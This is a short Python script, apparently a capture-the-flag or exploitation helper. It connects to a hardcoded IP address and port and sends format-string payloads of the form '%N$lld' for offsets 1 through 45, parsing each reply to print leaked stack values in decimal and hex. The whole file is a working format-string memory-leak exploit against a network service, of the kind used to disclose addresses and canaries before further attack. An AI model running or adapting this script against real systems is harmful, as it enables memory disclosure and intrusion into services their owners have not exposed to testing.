#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642

def conn():
    s=socket.socket(); s.settimeout(1.5); s.connect((HOST,PORT)); s.recv(300); return s

def test(txt):
    try:
        s=conn()
        s.send(txt)
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception as e:
        return b'ERR:'+str(e).encode()

def leak_lld(n):
    return test(("%%%d$lld\n" % n).encode())

for n in range(1, 46):
    r = leak_lld(n)
    time.sleep(0.04)
    m = re.search(rb'(?m)^[> ]*([0-9-]+)\n', r)
    if m:
        v = int(m.group(1))
        print(f"{n}: {v}  (0x{v & ((1<<64)-1):x})")
    else:
        print(f"{n}: RAW {r!r}")
